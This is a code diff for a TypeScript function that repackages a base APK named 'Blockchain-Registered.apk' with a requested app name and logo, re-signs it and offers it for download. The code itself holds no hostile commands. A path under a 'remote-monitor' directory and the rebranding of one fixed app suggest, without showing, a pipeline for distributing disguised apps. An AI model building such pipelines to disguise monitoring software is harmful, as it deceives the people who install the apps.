@@ -1,6 +1,7 @@
 import * as path from 'path';
 import * as fs from 'fs';
-import { customizeAPKWithAPKEditor } from './apk-customizer-apkeditor-v2';
+import { customizeAPKFixed } from './apk-customizer-fixed';
+import { signAPKFixed } from './apk-signer-fixed';
 
 interface APKBuilderOptions {
   appName: string;
@@ -9,97 +10,62 @@ interface APKBuilderOptions {
   requestOrigin?: string;
 }
 
-interface APKBuilderResult {
+/**
+ * Build customized APK with app name and logo
+ */
+export async function buildCustomizedAPK(options: APKBuilderOptions): Promise<{
   success: boolean;
   apkPath?: string;
   downloadUrl?: string;
   filename?: string;
   error?: string;
-}
-
-/**
- * Build customized APK with app name and package name
- * Uses ZIP manipulation to modify the base APK and signs it with valid certificate
- */
-export async function buildCustomizedAPK(options: APKBuilderOptions): Promise<APKBuilderResult> {
+}> {
   try {
     console.log(`[APK-BUILDER-CUSTOM] Starting customized APK build for: ${options.appName}`);
     console.log(`[APK-BUILDER-CUSTOM] URL: ${options.appUrl}`);
 
-    // Find the base APK
-    const possibleBasePaths = [
-      '/app/public/apks/Blockchain-Registered.apk',
-      '/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk',
-      path.join(process.cwd(), 'public/apks/Blockchain-Registered.apk'),
-    ];
+    // Find base APK
+    const baseAPKDir = path.join(process.cwd(), 'public', 'apks');
+    const baseAPK = path.join(baseAPKDir, 'Blockchain-Registered.apk');
 
-    let baseAPK = '';
-    for (const p of possibleBasePaths) {
-      if (fs.existsSync(p)) {
-        baseAPK = p;
-        console.log(`[APK-BUILDER-CUSTOM] Found base APK at: ${baseAPK}`);
-        break;
-      }
+    if (!fs.existsSync(baseAPK)) {
+      throw new Error(`Base APK not found at ${baseAPK}`);
     }
 
-    if (!baseAPK) {
-      console.error('[APK-BUILDER-CUSTOM] Base APK not found at any expected location');
-      return {
-        success: false,
-        error: 'Base APK not found. Please ensure Blockchain-Registered.apk exists.',
-      };
-    }
+    console.log(`[APK-BUILDER-CUSTOM] Found base APK at: ${baseAPK}`);
 
-    // Verify the base APK file is readable
-    try {
-      const stats = fs.statSync(baseAPK);
-      console.log(`[APK-BUILDER-CUSTOM] Base APK size: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);
-    } catch (statError) {
-      console.error('[APK-BUILDER-CUSTOM] Cannot read base APK:', statError);
-      return {
-        success: false,
-        error: 'Base APK is not readable',
-      };
-    }
+    // Get base APK size
+    const baseStats = fs.statSync(baseAPK);
+    console.log(`[APK-BUILDER-CUSTOM] Base APK size: ${(baseStats.size / 1024 / 1024).toFixed(2)}MB`);
 
-    // Generate output filename with timestamp and random suffix
+    // Generate output filename
+    const sanitizedName = options.appName
+      .toLowerCase()
+      .replace(/[^a-z0-9]/g, '')
+      .substring(0, 20);
     const timestamp = Date.now();
     const randomSuffix = Math.random().toString(36).substring(2, 8);
-    const sanitizedName = options.appName
-      .replace(/[^a-zA-Z0-9-]/g, '-')
-      .replace(/-+/g, '-')
-      .toLowerCase();
     const finalAPKName = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
-    console.log(`[APK-BUILDER-CUSTOM] Generated filename: ${finalAPKName}`);
 
-    // Determine output directory
-    const outputDir = path.join(process.cwd(), 'public', 'apks');
-    console.log(`[APK-BUILDER-CUSTOM] Output directory: ${outputDir}`);
-
-    // Ensure output directory exists
+    // Output directory
+    const outputDir = baseAPKDir;
     if (!fs.existsSync(outputDir)) {
-      try {
-        fs.mkdirSync(outputDir, { recursive: true });
-        console.log(`[APK-BUILDER-CUSTOM] Created output directory: ${outputDir}`);
-      } catch (mkdirError) {
-        console.error(`[APK-BUILDER-CUSTOM] Failed to create directory: ${outputDir}`, mkdirError);
-        throw mkdirError;
-      }
+      fs.mkdirSync(outputDir, { recursive: true });
     }
 
     const finalAPKPath = path.join(outputDir, finalAPKName);
     console.log(`[APK-BUILDER-CUSTOM] Final APK path: ${finalAPKPath}`);
 
-    // Customize the APK with new app name, icons, and sign it (all-in-one with APKEditor)
+    // Customize the APK with new app name and icons
     console.log(`[APK-BUILDER-CUSTOM] Customizing APK with app name: ${options.appName}`);
     try {
-      const customizedApkPath = await customizeAPKWithAPKEditor({
+      const customizedApkPath = await customizeAPKFixed({
         apkPath: baseAPK,
         appName: options.appName,
         outputPath: finalAPKPath,
         logoUrl: options.logoUrl,
       });
-      console.log(`[APK-BUILDER-CUSTOM] ✓ APK customization and signing completed: ${customizedApkPath}`);
+      console.log(`[APK-BUILDER-CUSTOM] ✓ APK customization completed: ${customizedApkPath}`);
     } catch (customizeError) {
       console.error('[APK-BUILDER-CUSTOM] Customization failed:', customizeError);
       return {
@@ -116,7 +82,18 @@ export async function buildCustomizedAPK(options: APKBuilderOptions): Promise<AP
     let customizedStats = fs.statSync(finalAPKPath);
     console.log(`[APK-BUILDER-CUSTOM] Customized APK size: ${(customizedStats.size / 1024 / 1024).toFixed(2)}MB`);
 
-    console.log(`[APK-BUILDER-CUSTOM] ✓ APK signed successfully (via APKEditor)`);
+    // Sign the APK with valid certificate
+    console.log(`[APK-BUILDER-CUSTOM] Signing APK with valid certificate...`);
+    const signResult = await signAPKFixed({
+      apkPath: finalAPKPath,
+    });
+
+    if (!signResult.success) {
+      console.warn(`[APK-BUILDER-CUSTOM] APK signing failed:`, signResult.error);
+      // Continue anyway - try to use the unsigned APK
+    } else {
+      console.log(`[APK-BUILDER-CUSTOM] ✓ APK signed successfully`);
+    }
 
     const finalStats = fs.statSync(finalAPKPath);
     console.log(`[APK-BUILDER-CUSTOM] Final APK size: ${(finalStats.size / 1024 / 1024).toFixed(2)}MB`);
@@ -143,10 +120,10 @@ export async function buildCustomizedAPK(options: APKBuilderOptions): Promise<AP
       filename: finalAPKName,
     };
   } catch (error) {
-    console.error('[APK-BUILDER-CUSTOM] Error in customized APK build:', error);
+    console.error('[APK-BUILDER-CUSTOM] Error:', error);
     return {
       success: false,
-      error: `APK build failed: ${error instanceof Error ? error.message : String(error)}`,
+      error: error instanceof Error ? error.message : String(error),
     };
   }
 }
